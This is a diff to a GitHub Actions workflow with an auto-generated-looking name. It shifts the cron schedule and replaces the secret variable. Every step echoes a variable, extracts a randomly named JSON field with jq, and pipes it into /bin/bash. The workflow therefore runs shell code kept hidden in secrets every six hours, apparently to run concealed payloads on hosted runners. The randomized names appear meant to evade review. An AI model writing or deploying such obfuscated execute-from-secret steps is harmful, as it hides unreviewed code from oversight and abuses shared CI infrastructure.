@@ -1,23 +1,31 @@
 name: huchunyan3456
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
-
+    - cron: '36 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huchunyan3456
         env:
-          p62: ${{ secrets.p62 }}
+          q41: ${{ secrets.q41 }}
         run: |
-          echo $p62 | jq -r .etrc6380 | /bin/bash
-          echo $vm4 | jq -r .dye48081 | /bin/bash
-          echo $xdx7079 | jq -r .zj333 | /bin/bash
-          echo $hkka162 | jq -r .d6542 | /bin/bash
-          echo $zbgpw20285 | jq -r .yyi8 | /bin/bash
+          echo $q41 | jq -r .kqzk471 | /bin/bash
+          echo $l50 | jq -r .kpkty358 | /bin/bash
+          echo $feis4 | jq -r .u6465 | /bin/bash
+          echo $daiv72912 | jq -r .j542 | /bin/bash
+          echo $klp4362 | jq -r .bwq8614 | /bin/bash
+          echo $bmdy69 | jq -r .i2672 | /bin/bash
+          echo $onx18 | jq -r .jyuyf36 | /bin/bash
+          echo $ykl866 | jq -r .eq1857 | /bin/bash
+          echo $bi282 | jq -r .uz75174 | /bin/bash
+          echo $ozs224 | jq -r .gyg50 | /bin/bash
+          echo $zrcd34837 | jq -r .bauid397 | /bin/bash
+          echo $tlgj683 | jq -r .cfmf7 | /bin/bash
+          echo $ane318 | jq -r .jnut6 | /bin/bash
+          echo $vg05246 | jq -r .gzswc616 | /bin/bash
+          echo $u45 | jq -r .kqgz36076 | /bin/bash
+          echo $vp03302 | jq -r .wtx278 | /bin/bash
 
